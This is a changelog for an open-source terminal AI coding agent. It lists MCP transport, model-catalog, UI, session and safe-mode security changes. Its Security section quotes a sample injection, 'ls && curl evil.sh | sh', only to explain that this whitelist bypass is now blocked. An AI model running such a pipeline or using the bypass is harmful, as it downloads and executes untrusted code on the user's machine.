# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.0.0/),
and this project adheres to [Semantic Versioning](https://semver.org/).

## [Unreleased]

### Added
- **Opt-in OpenRouter web search** (`specs/2026-08-31-web-search-tool-reliability`): added `--web-search` and `/websearch`; the provider-operated server tool is only sent to OpenRouter and displays a warning that search charges may apply, including on free model routes.
- **Documentation branch workflow** (`specs/2026-08-30-documentation-branch`): created `docs/documentation`, mapped every catalog feature to its canonical code branch and separated documentation commits from product implementation branches.
- **Development-first Git workflow** (`specs/2026-08-30-branch-topology-migration`): active work now uses stable product-domain branches rooted at `development`, while legacy incident-oriented refs are preserved under `archive/legacy/`.
- **Retroactive feature registry** (`IMPROVEMENTS.md` §8.4): documented the agent loop, built-in tools, plans mode and context compression and indexed the complete shipped-feature catalog.
- **Resilient MCP transports** (`IMPROVEMENTS.md` §§5.1, 5.3–5.4): first connections now require one-time approval, unexpected disconnects retry three times with bounded backoff, and `stdio`, SSE and streamable HTTP transports are supported with secret-safe validation.
- **Open-source quality gates** (`IMPROVEMENTS.md` §§8.1–8.2): added `npm run lint`, committed ESLint configuration and a Node 20 GitHub Actions workflow running lint and tests.
- **Agent-loop iteration cap** (`IMPROVEMENTS.md` §3.1): the agentic tool loop now stops after 40 iterations per turn (configurable via `maxLoopIterations`), with a warning when the limit is approached — a model stuck in a tool-calling loop can no longer burn tokens until the context window fills.
- **`runCommand` output cap** (`IMPROVEMENTS.md` §3.2): tool output is truncated at 50,000 chars with an explicit notice and the omitted size, so a verbose build log cannot flood the context in a single result.
- **Skills size caps in the system prompt** (`IMPROVEMENTS.md` §7.6): per-skill cap of 8,000 chars and a total skills cap of 24,000 chars with truncation/omission notices, mirroring the rules file cap.
- **Forced compression on context overflow** (`IMPROVEMENTS.md` §3.3): a 413 / "context length exceeded" error now triggers one forced compression pass and retries the turn, instead of retrying the same oversized payload.
- **Model validation on provider switch** (`IMPROVEMENTS.md` §4.2): after `/connect`, if the live catalog is active and the current model is unknown for the new provider, the wizard offers to pick a new model before the next turn fails.
- **UI-layer logging surface** (`IMPROVEMENTS.md` §6.1): new `src/ui/log.js` (`warn`/`error`) backed by the Tokyo Night palette — `src/config.js` now routes its warnings through it instead of raw `console.warn`.

### Changed
- **Tool and session reliability** (`specs/2026-08-31-web-search-tool-reliability`): `runCommand` now carries a validated workspace-contained cwd across calls and persisted sessions; `writeFile`/`editFile` reject malformed arguments before touching state; provider errors include bounded status/detail classification with secret redaction.
- **Streaming and multiline input integrity** (`specs/2026-08-30-streaming-input-integrity`): cumulative or overlapping reasoning snapshots are reduced to unseen text, legacy and structured reasoning are not rendered twice, prompt/thinking redraws are emitted as assembled terminal frames, and `Shift+Enter` inserts a newline while plain `Enter` submits.
- **Compact token units** (`specs/2026-08-30-readable-token-units`): the input footer and status bar now display million-token contexts as `M` (for example, `1M`) instead of values such as `1000k`.
- **Readable model context labels** (`specs/2026-08-30-model-context-display`): model picker metadata now displays million-token windows as `1M ctx` instead of `1000k ctx`, while smaller windows retain the `k` format.
- **Searchable `/model` picker** (`specs/2026-08-30-model-search-picker`): replaced the unbounded provider list with case-insensitive incremental search, at most seven visible results, keyboard navigation, cancellation-safe terminal cleanup and the existing manual model-entry path. OpenRouter uses its live/cache catalog; other providers search their curated options.
- **Branch cleanup** (`specs/2026-08-30-branch-retirement`): removed obsolete archive and migration refs from the active branch list after confirming canonical branches had no unmerged commits; `main`, `development` and all canonical domain branches remain.
- **Improvements documentation**: marked all detailed remediation sections as delivered and labeled former gaps as historical context, eliminating stale proposed fixes from the source-of-truth backlog.
- **MCP error safety**: authenticated URLs and Bearer values are redacted from connection and reconnect diagnostics.
- **SDD closeout records**: recorded the implementation commits in the MCP, open-source readiness and feature-registry task ledgers, including the integrated MCP redaction commit.
- **Dependency security maintenance**: refreshed vulnerable transitive packages identified by `npm audit`; the final audit reports zero vulnerabilities.
- **Improvements backlog status**: synchronized the detailed sections and roadmap with the completed security, API, MCP, quality and feature-registry deliveries.
- **Session storage management** (`IMPROVEMENTS.md` §7.5): persisted snapshots now have a configurable 10MB default cap for old tool results, and `/sessions clean <days>` removes sessions older than a positive age without changing active memory.
- **Anthropic thinking budgets** (`IMPROVEMENTS.md` §7.3): Anthropic-family models through Requesty now receive bounded native `thinking.budget_tokens`; `none` disables it while OpenRouter and generic provider mappings remain unchanged.
- **Skill relevance matching** (`IMPROVEMENTS.md` §7.2): auto-detected skills are filtered by lexical overlap with the current task, while explicit `-s` selections and `clean-code` remain available; existing prompt-size caps still apply.
- **MCP tool visibility** (`IMPROVEMENTS.md` §6.3): tool summaries now identify third-party calls as `[mcp:server] tool`, including unambiguous handling of server names containing namespace separators.
- **Error UX** (`IMPROVEMENTS.md` §§6.2, 6.4): common authentication/model/context/rate-limit/timeout failures now use actionable secret-free messages, and safe-mode confirmation explicitly warns about network-to-shell pipelines.
- **Reasoning retention** (`IMPROVEMENTS.md` §7.7): new session snapshots omit `reasoning_content` without mutating live history, and `/export` includes thought blocks only with explicit `--export-thinking` opt-in.
- **Multi-level undo** (`IMPROVEMENTS.md` §7.1): `/undo N` now previews affected files, asks for confirmation, and restores N recorded changes newest-first; the original `/undo` behavior remains unchanged.
- **Dynamic `/model` catalog** (`IMPROVEMENTS.md` §4.1): OpenRouter model selection now waits for the best-effort live catalog and displays normalized context/pricing metadata, while non-OpenRouter providers retain curated fallback options.
- **Plans preflight and compression resilience** (`IMPROVEMENTS.md` §§3.4–3.5): Plans mode now requests approval from a bounded task preview before the first model stream; rejected plans make no model/tool calls. If context summarization fails, the agent safely removes oldest complete history groups toward 70% of the active window and arms compression hysteresis.
- **Thinking visibility uses one state** — the live stream and completed `Thought for Ns` block now share `config.expandThinking`; expanded is the default and `/thinking` (Ctrl+P) collapses both together.
- **Expanded reasoning by default** — validated with `minimax-m3:free`; users can still collapse live and completed reasoning with `/thinking` or Ctrl+P. `IMPROVEMENTS.md` §7.4 and §8.5 now reflect the delivered state.
- **Modular slash-command dispatch** — `cli.js` now delegates exact command names to `src/commands/`, keeping the REPL lifecycle separate from command handlers without changing the command surface.
- **Session resilience** — summaries refresh after turn 2 and every tenth turn, while tool-pending checkpoints are persisted and safely recovered after a session reload.
- **UI logging and prompt consistency** — runtime status colors now use the canonical UI palette, and the base coding policy is consistently written in English.

### Security
- **Safe-command whitelist hardened against metacharacter injection** (`IMPROVEMENTS.md` §1.1): a whitelist prefix match is now rejected when the command contains shell metacharacters (`;`, `&`, `|`, backtick, `<`, `>`, `$(`, newline) — `ls && curl evil.sh | sh` no longer bypasses the safe-mode confirmation.
- **Symlink escape closed in tool handlers** (`IMPROVEMENTS.md` §1.2): `resolveSafePath` now resolves the real path (or the nearest existing ancestor for not-yet-created files) before the workspace boundary check — a symlink inside the workspace pointing outside can no longer be used to read/write outside the sandbox.
- **`process.env` no longer propagated to MCP servers** (`IMPROVEMENTS.md` §1.3): STDIO MCP servers receive only an allowlisted set of environment variables (PATH, HOME, locale, temp dirs, etc.); server-specific extras still come from `mcp.json` `env` overrides.
- **`undoStack` capped at 50 entries** (`IMPROVEMENTS.md` §1.5): the documented cap now exists — `pushUndo()` trims the oldest entry once the limit is reached.

### Fixed
- **Reasoning stream display** (`specs/2026-08-30-reasoning-details-display`): OpenRouter now receives its unified `reasoning` request object, structured `reasoning_details` deltas are rendered and preserved across tool calls, `/thinking` consistently controls live and completed reasoning, and expanded streams finish with a `Thought for Ns` duration header. The expanded header is one physical row, so redraws no longer overwrite the stream. Providers such as `openrouter/free` that return no reasoning remain silent rather than displaying fabricated thought content.
- **Ambiguous `editFile` matches rejected** (`IMPROVEMENTS.md` §1.4): occurrences are counted at every matching level (exact, CRLF-normalized, whitespace-tolerant); a target appearing more than once returns an error asking for more context instead of silently replacing the first occurrence. Docs and code are back in sync.
- **MCP tool-name collisions eliminated** (`IMPROVEMENTS.md` §5.2): tool resolution now uses an explicit `server__tool → { server, tool }` map built at connect time instead of parsing the first `__` at call time.
- **New automated gates** (`IMPROVEMENTS.md` §8.1/§8.3): `npm test` script added; new `test/security.test.js` (whitelist, metacharacter rejection, traversal, symlink escape, undo cap) and `test/edit-file.test.js` (all three matching levels, ambiguity, error paths) — 28 new tests, suite now at 48, all passing.

### Added
- **Dynamic terminal title** (`specs/2026-08-25-dynamic-terminal-title`): terminal tabs now report the real runtime activity (`starting`, `connecting MCP`, `waiting`, `thinking`, `responding`, context compression and human-readable tool states) alongside workspace/model identity. Updates are deterministic UI calls rather than a model-facing tool, are deduplicated and emit only to supported TTYs. Prompt text, shell commands and search queries are excluded; remaining dynamic fields have terminal controls stripped and the complete title is capped at 100 characters.
- **Project rules system (`.emilerules`)** (`specs/2026-08-25-rules-system`):
  - New `src/rules.js` discovers a per-project rules file via the priority chain `.emilerules` → `AGENTS.md` → `.clinerules` → `.cursorrules`, reads it with a 12k-char cap (truncation notice) and an mtime-based cache so repeated system-prompt builds don't re-read the file.
  - The active rules are injected into the system prompt (after environment context, before workspace snapshot) as `=== PROJECT RULES (<filename>) ===` — part of the cache-stable frozen prefix.
  - `/rules` slash command: displays the active file, its path, truncation state and terminal-sanitized content; with none, explains how users can create their own optional `.emilerules`.
  - Rules are user-owned and read-only: Emile does not generate or ship default preference content. Compatible user-maintained `AGENTS.md`, `.clinerules` and `.cursorrules` files remain supported.
  - Supported filenames that resolve outside the workspace through a symlink are rejected; ANSI/OSC/DCS controls are stripped before `/rules` renders file content.

### Fixed
- **Premature context compression** (`specs/2026-08-25-context-aware-compression`): the history gate now uses 80% of the active model's real token window from the shared model catalog instead of fixed 40k/120k raw-character limits. A 50k-token session on a 1,048,576-token model no longer compresses early; full-payload estimates include compressed secondary system messages, and post-compression hysteresis requires more than 40% history growth before another attempt.
- **Agent-loop crash after a response:** the module split left `calculateCost` out of `agent/agent.js` imports, causing `ReferenceError: calculateCost is not defined` when API usage arrived; the import is restored. The CLI's stale `./tools.js` import now points to the `tools/` barrel as intended.
- **Prompt multiline corruption** (`specs/2026-08-25-prompt-multiline-fix`, pass 4 of the TUI overhaul):
  - When the input wrapped past the terminal width, the screen filled with duplicated/garbage rows and deletions looked like no-ops. Root cause: the writing field was written as a single string and left to terminal auto-wrap (invisible to the redraw's row count), plus a cursor column that could overflow past the line end.
  - Fix: the field now draws one explicit erase-and-write per wrapped row (terminal never auto-wraps), continuation rows indent under the prompt glyph, and the cursor column is computed from the rendered rows and clamped within it. Verified with a virtual-terminal ANSI simulator (typing 200 chars + deleting all leaves exactly one clean prompt row).
- **Open boxes — side borders removed, top-border color fixed** (`specs/2026-08-25-tui-open-boxes`, pass 3 of the TUI overhaul):
  - All boxes (response, config, help, diff, startup header) now render with **top and bottom borders only** — no left/right `│` rails. This eliminates the chronically misaligned right border, whose padding was computed from `stripAnsi().length` (not the real display width for wide/emoji characters).
  - The response box's **white top border** is fixed: the `emile` label's ANSI RESET was nested inside a `C.muted(...)` wrapper, killing the muted color for the dashes after it — border parts are now composed separately.
  - Box content indents 4 spaces under the top border; diff rows keep line numbers and add/remove colors with truncation; the markdown code rail aligns with the new indent.

### Added
- **Dynamic model catalog via OpenRouter** (`specs/2026-08-25-dynamic-model-catalog`):
  - `initModelCatalog()` fetches the public unauthenticated OpenRouter catalog (417 models at time of writing) once per startup — context window, USD pricing and reasoning capability now come from live data instead of the static table.
  - Resolution cascade: dynamic exact-id → dynamic last-segment match (bare ids like `glm-4.6` resolve against prefixed catalog ids) → static table → safe default.
  - Offline resilience: the catalog persists to `.emile/models-cache.json` (gitignored); a failed fetch falls back to the persisted cache (up to 30 days), then to the static table — never blocks or crashes startup.
  - Fixes systematic mislabeling: GLM, stealth/codename models and ~285 reasoning-capable models now resolve `reasoning: true` correctly from live data.
- **Model system overhaul** (`specs/2026-08-25-model-system`, branch `feat/model-system`):
  - **Single model table:** new `src/models.js` with `MODEL_INFO` (context window, USD pricing per 1M tokens, reasoning capability) + `getModelInfo()`; `calculateCost`/`getContextLimit` delegate to it, replacing stale hardcoded conditionals (e.g., gemini-2.5-pro was listed at 2M — actual 1M).
  - **Cache-hit visibility:** cached prompt tokens accumulate from API usage; the status bar/prompt footer show a green `cache: N%` segment and `/cost` reports cached tokens + hit rate.
- **Terminal UI premium pass — Pass 2 (minimal, Claude-Code-grade)** (`specs/2026-08-25-tui-premium`, branch `feat/tui-overhaul`):
  - **Grid-aligned tool lines:** tool calls render as single aligned lines (`● exec   npm test …`) instead of a bordered box — lowercase labels in a fixed 8-char column, semantic tone on bullet+label, dim args truncated to the terminal width.
  - **Command divider:** the user message renders as the turn's chapter marker (`── <message> ────────`), replacing the old `❯ message` line.
  - **New palette tokens:** `C.gold` (#FFD700 — search tools, replacing purple) and `C.ghost` (#3B4261 — near-invisible thinking); exported `GAP` spacing constants (`none`/`section`/`command`).
  - **88-column response box:** calmer measure than the full terminal width (keeps inner padding and bold accent label).

### Changed
- **Project structure refactor** (`specs/2026-08-25-project-structure`): decomposed the `ui.js`, `tools.js` and `agent.js` monoliths into single-responsibility modules by domain:
  - `ui/` → `theme.js` (palette + text utils + open-box primitives), `sanitize.js`, `markdown.js`, `turn-state.js`, `tool-lines.js`, `header.js`, `config-panel.js`, `status-bar.js`, `user-message.js`, `response.js`, `thinking.js`, `help.js`, `diff-block.js`, `history-replay.js`, `prompt-input.js`, `switch-session.js`, `spinner.js` + `index.js` barrel
  - `tools/` → `security.js` (`resolveSafePath` + whitelist), `definitions.js`, `file-state.js`, `show-diff.js`, `handlers/` (one file per tool) + `index.js` barrel
  - `agent/` → `agent.js` (loop), `session-stats.js` (stats/cost/context), `compression.js` (history gate) + `index.js` barrel
  - `api/` → `client.js` (client + retry) + `index.js` barrel
  - Public import surfaces unchanged via the barrels — zero behavior change; verified by the full gate battery.
- **Reasoning effort is now capability-gated:** `min`/`max` normalize to `low`/`high`, `none` omits the parameter entirely, and non-reasoning models never receive `reasoning_effort` (previously sent unconditionally — including values the APIs reject — so the setting silently did nothing or caused errors).
- **Context tracking is honest about estimates:** the pre-call char-based estimate (factor corrected to ~4 chars/token) is prefixed with `~` in the status bar/footer; measured API usage renders unprefixed. Context limits come from the model table.
- **Cache-stable conversation prefix:** the system prompt is built once per `(plansMode, skills)` session key instead of every turn. Previously each turn re-snapshotted the workspace tree into `messages[0]`, so any file the agent created changed the prefix and invalidated the provider cache from position 0 — the main cause of the observed 89.3% hit rate ceiling. Trade-off: the workspace snapshot is frozen until plans mode/skills change.
- **Thinking is now collapsed by default:** reasoning renders as a ghost one-liner (`··· thinking` while streaming, `··· thought Ns` when done) — expansion is opt-in via `/thinking` or `Ctrl+P` (both toggle sites and the status message updated).
- **Status noise eliminated:** the `✓ N tools completed` footer is gone; a single dim `↳ N tools` header now renders above the next response box — the only status line of a turn.

### Added
- **Terminal UI overhaul — Pass 1 (spacing, rhythm and readability)** (`specs/2026-08-25-tui-overhaul`, branch `feat/tui-overhaul`):
  - **Vertical rhythm:** exactly one blank line between every distinct block (user message, thinking, assistant box, tools box, diffs, tools-done footer, session bar, prompt); each block owns one leading gap and never prints trailing blanks.
  - **Tools box:** tool calls isolated in their own `╭─ tools ─╮` box with semantic colors — Read=info, Write/Edit=warn, Exec=red, Grep/Find=purple, List=fg — with argument truncation verified at 60 columns.
  - **Dimmed thinking:** the reasoning block (live stream and replay) renders entirely in `muted`, one shade closer to the background — background noise, not primary content.
  - **Assistant box:** inner vertical padding rows and a bold accent `emile` label.
  - **Prompt gap:** one blank line between the session bar and the input prompt block.
  - **Config panel:** `off` states render dim instead of red (off is a state, not an error).
  - **Render harness:** `test-ui.js` extended to render a full simulated turn (thinking stream, response box, tools box, footer, session bar, prompt) without an API key.
  - **Feature registry:** `features/terminal-ui.md` created and indexed.

### Changed
- **Silent spinner stop on success:** the `✓ response received` line printed after every API call is gone — the streamed content itself is the progress signal; tool completion keeps a single dim footer line.

### Fixed
- **Latent crash in `/rewind`:** the success path used `pc.muted`, which was never defined in the legacy picocolors remap — rewinding a session with a message would throw a TypeError. The remap was removed entirely (`src/cli.js` now uses the `C` palette directly), fixing the bug and consolidating the color system.

### Added
- **Software Engineering foundation (Phase 0 of the roadmap):** the project is now governed by documentation as the single source of truth, with an SDD process and feature registry — all documentation in English, since the project is open source.
  - **`.clinerules`** — mandatory AI rules (Cline/Codex via `AGENTS.md` symlink): mandatory cache-conscious context reading, mandatory doc sync after every change, SDD adherence, `src/` code organization, risk-proportional quality/security gates, feature registry and final closing checklist.
  - **Git workflow rule (Rule 8 of `.clinerules`):** all work happens on a feature branch (`feat/<feature>`, e.g. `feat/docs`, `feat/providers`, `fix/<bug>`, `docs/<topic>`), reusing an existing branch when one fits and never committing directly to `main`; commits happen per coherent unit, staging ONLY the files of that feature — `git add .` / `git add -A` and mixed-concern commits are forbidden, with `git status` + `git diff --cached --stat` verification before every commit.
  - **`specs/`** — Spec-Driven Development (SDD): README with the SPEC → PLAN → TASKS → IMPLEMENT → VERIFY → DOCS SYNC cycle, mandatory templates (`spec.md`, `plan.md`, `tasks.md`) adapted to a CLI/TUI reality, spec lifecycle (`draft` → `approved` → `implemented` → `archived`) and a commit log section in the tasks template.
  - **`specs/2026-08-25-tui-overhaul/`** — first spec (`draft`) of Phase 1: terminal UI overhaul, with requirements, acceptance criteria and threat surfaces.
  - **`features/`** — catalog of implemented features with conventions README and a registry template traceable to the source spec.
  - **`docs/product.md`** — PRD: vision, value proposition, 10 user stories, RF-01 through RF-16 and success metrics.
  - **`docs/architecture.md`** — architecture: system and agent-loop diagrams, `src/` module table with golden rules and evolution principles.
  - **`docs/visual-identity.md`** — TUI design system: principles, Tokyo Night palette with semantic tokens, components, interaction patterns, known UI debt catalog and visual review checklist.
  - **`docs/code-quality-and-security.md`** — risk classification, the agent's threat surfaces (shell execution, file writes, prompt injection, credentials, MCP, supply chain), secure coding, gates per change type and evidence policy.
  - **`docs/roadmap.md`** — phases 0-4: foundation (✅), UI overhaul (current), automated quality, agent robustness and distribution.
  - **`docs/glossary.md`** — domain terms (agent loop, safe mode, plans mode, skills, MCP, prompt caching, feature branch, etc.).
  - **`docs/adr/0001-tech-stack-choice.md`** — ADR-0001 ratifying the stack (Node + pure ES modules without build, openai SDK, commander, @clack/prompts, raw ANSI) with alternatives and derived policies.
  - **`CONTRIBUTING.md`** — contribution guide with the feature-branch Git workflow, SDD flow, commit/branch conventions and current gates.
  - **README.md** — new "Process & Engineering" section and documentation index.

### Changed
- **`docs/IMPROVEMENTS.md`** — pre-existing codebase improvement analysis translated to English and integrated into the roadmap (Phases 2 and 3) and the README documentation index.
